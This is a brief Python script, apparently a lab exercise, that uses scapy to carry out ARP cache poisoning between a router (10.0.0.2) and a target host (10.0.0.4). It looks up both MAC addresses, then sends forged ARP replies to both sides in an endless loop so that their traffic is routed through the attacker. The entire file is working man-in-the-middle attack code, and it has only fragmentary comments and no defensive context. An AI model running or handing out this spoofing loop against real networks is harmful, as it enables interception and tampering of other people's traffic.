from types import NoneType
from scapy.all import *

router_ip = "10.0.0.2"
target_ip = "10.0.0.4"



# disable icmp redirets so 

# I need router mac address to send to 
def get_mac(router_ip, target_ip):
    # Craft packets
    router_packet = ARP(pdst=router_ip)
    target_packet = ARP(pdst=target_ip)
    router_response = sr1(router_packet, timeout=2)
    target_response = sr1(target_packet, timeout=2)
    router_mac = router_response.hwsrc
    target_mac = target_response.hwsrc
    return router_mac, target_mac

router_mac, target_mac = get_mac(router_ip, target_ip)


while True:
    target_arp = ARP(op=2, pdst=target_ip, psrc=router_ip, hwdst=target_mac)
    router_arp = ARP(op=2, pdst=router_ip, psrc=target_ip, hwdst=router_mac)
    send(target_arp, verbose=False)
    send(router_arp, verbose=False)
    time.sleep(1)